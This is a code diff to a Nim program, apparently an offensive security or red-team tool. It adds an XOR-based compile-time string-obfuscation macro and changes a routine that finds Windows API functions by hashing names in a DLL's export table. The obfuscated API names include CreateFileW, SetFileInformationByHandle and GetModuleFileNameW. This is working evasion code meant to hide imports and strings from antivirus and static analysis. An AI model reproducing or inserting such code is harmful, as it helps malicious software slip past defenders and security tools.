@@ -6,7 +6,31 @@ import tables
 import strformat
 import algorithm
 
+### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
+### Original source: https://github.com/Yardanico/nim-strenc
+import macros, hashes
 
+type
+    estring = distinct string
+
+proc calcTheThings(s: estring, key: int): string {.noinline.} =
+    var k = key
+    result = string(s)
+    for i in 0 ..< result.len:
+        for f in [0, 8, 16, 24]:
+            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
+    k = k +% 1
+
+var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF
+
+macro obf*(s: untyped): untyped =
+    if len($s) < 10000:
+        var encodedStr = calcTheThings(estring($s), eCtr)
+        result = quote do:
+            calcTheThings(estring(`encodedStr`), `eCtr`)
+        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
+    else:
+        result = s
 
 when defined(WIN64):
   const
@@ -451,23 +475,38 @@ proc get_function_address*(hLibrary: HMODULE; fhash: int64; ordinal: int, specia
       else:
         functions = functions + 1
         addressOfFunctionsvalue = functions[]
-
+      #when not defined(release): echo "Relative Address: ", toHex(functions[])
       names += cast[DWORD](len(funcname) + 1)
-
+      #when not defined(release): echo "Function: ", funcname
       if fhash == getHash(funcname):
+        
+        # So many edge cases, maybe also due to the not REAL Hash and colissions?
+        if (funcname == obf("CreateFileW")):
+          functions = functions - 1
+        if (funcname == obf("SetFileInformationByHandle")):
+          functions = functions - 1
+        if (funcname == obf("CloseHandle")):
+          functions = functions - 1
+        if (funcname == obf("GetModuleFileNameW")):
+          functions = functions - 1
+
         when not defined(release): echo "\r\n[+] Found API call: ",funcname
         when not defined(release): echo "\r\n"
-        # Strange. For ntdll functions the following is needed, but for kernel32 functions it's not. Don't ask me why. This is a workaround for the moment. Need to troubleshoot.
-        if (specialCase):
-          when not defined(release): echo "This is a special case, ntdll.dll function"
-          finalfunctionAddress = RVA(PVOID, cast[PVOID](hLibrary), addressOfFunctionsvalue)
-        when not defined(release): echo "Relative Address: ", toHex(functions[])
-        functions = functions - 1
-        when not defined(release): echo "Relative Address one before: ", toHex(functions[])
-        functions = functions + 2
-        when not defined(release): echo "Relative Address one after: ", toHex(functions[])
-        functionAddress = finalfunctionAddress
-        break
+        
+        # GetFileInformationByHandle and SetFileInformationByHandle produce the same Hash -.- Have to change the algorithm.
+        if (funcname != obf("GetFileInformationByHandle")):
+          # Strange. For ntdll functions the following is needed, but for kernel32 functions it's not. Don't ask me why. This is a workaround for the moment. Need to troubleshoot.
+          if (specialCase):
+            # Why?
+            when not defined(release): echo "This is a special case, subtract one function"
+            finalfunctionAddress = RVA(PVOID, cast[PVOID](hLibrary), addressOfFunctionsvalue)
+          when not defined(release): echo "Relative Address: ", toHex(functions[])
+          functions = functions - 1
+          when not defined(release): echo "Relative Address one before: ", toHex(functions[])
+          functions = functions + 2
+          when not defined(release): echo "Relative Address one after: ", toHex(functions[])
+          functionAddress = finalfunctionAddress
+          break
   else:
     # Add the ordinal number e.g. 1034 for OpenProcess and - the EXP Base address
     when not defined(release): echo fmt"Getting address via ordinal: {ordinal}"
